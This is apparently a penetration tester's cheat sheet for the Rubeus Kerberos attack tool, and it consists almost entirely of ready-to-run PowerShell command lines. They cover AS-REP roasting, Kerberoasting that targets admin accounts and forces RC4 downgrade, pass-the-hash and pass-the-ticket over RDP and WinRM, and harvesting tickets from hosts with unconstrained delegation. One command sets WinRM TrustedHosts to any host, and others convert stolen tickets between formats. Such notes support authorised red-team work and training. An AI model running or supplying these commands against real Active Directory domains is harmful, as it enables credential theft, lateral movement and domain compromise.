---
tags:
  - tool
  - active_directory
  - kerberos
---
# Rubeus

C# toolset for raw Kerberos interaction and abuses - [Rubeus](https://github.com/GhostPack/Rubeus)

## Capabilities

```powershell
# AS-REP roast the current user
.\Rubeus.exe asreproast /nowrap

# Kerberoast the current user
.\Rubeus.exe kerberoast /nowrap

# Check encryption and password last set date for kerberoastable users
.\Rubeus.exe kerberoast /stats

# Request tickets for high-value targets
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Kerberoast an account
.\Rubeus.exe kerberoast /user:$USER /nowrap
.\Rubeus.exe kerberoast /domain:$DOMAIN /dc:$DC /user:$USER /nowrap

# Downgrade request to RC4 encryption (only works against Windows Server 2016 and earlier)
.\Rubeus.exe kerberoast /tgtdeleg

# Pass the ticket via RDP
.\Rubeus.exe createnetonly /program:powershell.exe /show
# In new window
.\Rubeus.exe asktgt /user:$USER /rc4:$HASH /domain:$FQDN /ptt
mstsc.exe /restrictedAdmin
# This will show credentials for the current logged-in user, but it does not matter

# Pass the ticket via WinRM
.\Rubeus.exe asktgt /user:$USER /rc4:$HASH /nowrap
.\Rubeus.exe createnetonly /program:powershell.exe /show
# In new window
.\Rubeus.exe ptt /ticket:$TICKET_BLOB
Enter-PSSession $FQDN -Authentication Negotiate
# NOTE: Kerberos double hop problem occurs in this case

# Pass a kirbi ticket that was generated
.\Rubeus.exe asktgs /ticket:$TICKET_FILE /service:cifs/$TARGET_FQDN /dc:$DC_FQDN /ptt

# Monitor for incoming tickets as a user with unconstrained delegation
.\Rubeus.exe monitor /interval:5 /nowrap
.\Rubeus.exe monitor /interval:5 /nowrap /runfor:60
```

**Note:** `/nowrap` prevents any base64 ticket blobs from being column wrapped for any function, making for easier pasting.

In the case of a `TrustedHosts` error, we can use the following command.

```powershell
Set-Item WSMan:localhost\client\trustedhosts -value * -Force
```

If we are not admins, we can use explicit credentials with `-Credential` or `Invoke-Command`

```powershell
# Convert base64 to .kirbi
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64RubeusTGT))

# Convert .kirbi to .ccache
ticketConverter.py Administrator.kirbi Administrator.ccache
```
